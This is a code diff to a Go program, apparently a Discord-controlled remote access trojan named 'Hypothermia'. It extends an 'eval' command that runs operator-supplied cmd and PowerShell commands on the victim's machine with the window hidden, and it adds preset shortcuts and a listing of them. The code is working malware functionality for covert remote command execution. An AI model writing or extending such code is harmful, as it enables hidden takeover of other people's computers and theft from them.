@@ -7,11 +7,12 @@ import (
 	"strings"
 	"syscall"
 
+	"Hypothermia/src/utils"
 	"github.com/bwmarrin/discordgo"
 )
 
 const (
-	evalUsage string = "[cmd/powershell] [...args]"
+	evalUsage string = "([cmd/powershell] [...args]) | [shortcut]"
 
 	evalArgsError string = "🟥 Expected 2 or more arguments."
 	evalUseError  string = "🟥 Invalid argument."
@@ -30,16 +31,50 @@ func (*EvalCommand) Run(s *discordgo.Session, m *discordgo.MessageCreate, args [
 		return err
 	}
 
-	var cmd *exec.Cmd
-	if args[0] == "powershell" || args[0] == "ps" {
-		cmd = exec.Command("powershell", "-Command", strings.Join(args[1:], " "))
+	if args[0] == "?" {
+		var shortcuts string = "Shortcuts:\n\n"
+
+		for name := range utils.CmdShortcuts {
+			shortcuts += name + "\n"
+		}
+
+		for name := range utils.PsShortcuts {
+			shortcuts += name + "\n"
+		}
+
+		_, err := s.ChannelMessageSendReply(m.ChannelID, shortcuts, m.Reference())
+		return err
+	}
+
+	cmdName := ""
+	cmdArgs := []string{}
+
+	if val, ok := utils.CmdShortcuts[args[0]]; ok {
+		cmdName = "cmd"
+		cmdArgs = []string{"/C", val}
+	} else if val, ok := utils.PsShortcuts[args[0]]; ok {
+		cmdName = "powershell"
+		cmdArgs = []string{"-Command", val}
+	} else if args[0] == "powershell" || args[0] == "ps" {
+		if len(args) < 2 {
+			_, err := s.ChannelMessageSendReply(m.ChannelID, evalArgsError+"\nUsage: "+evalUsage, m.Reference())
+			return err
+		}
+		cmdName = "powershell"
+		cmdArgs = []string{"-Command", strings.Join(args[1:], " ")}
 	} else if args[0] == "cmd" {
-		cmd = exec.Command("cmd", "/C", strings.Join(args[1:], " "))
+		if len(args) < 2 {
+			_, err := s.ChannelMessageSendReply(m.ChannelID, evalArgsError+"\nUsage: "+evalUsage, m.Reference())
+			return err
+		}
+		cmdName = "cmd"
+		cmdArgs = []string{"/C", strings.Join(args[1:], " ")}
 	} else {
 		_, err := s.ChannelMessageSendReply(m.ChannelID, evalUseError+"\nUsage: "+evalUsage, m.Reference())
 		return err
 	}
 
+	cmd := exec.Command(cmdName, cmdArgs...)
 	cmd.SysProcAttr = &syscall.SysProcAttr{
 		HideWindow: true,
 	}
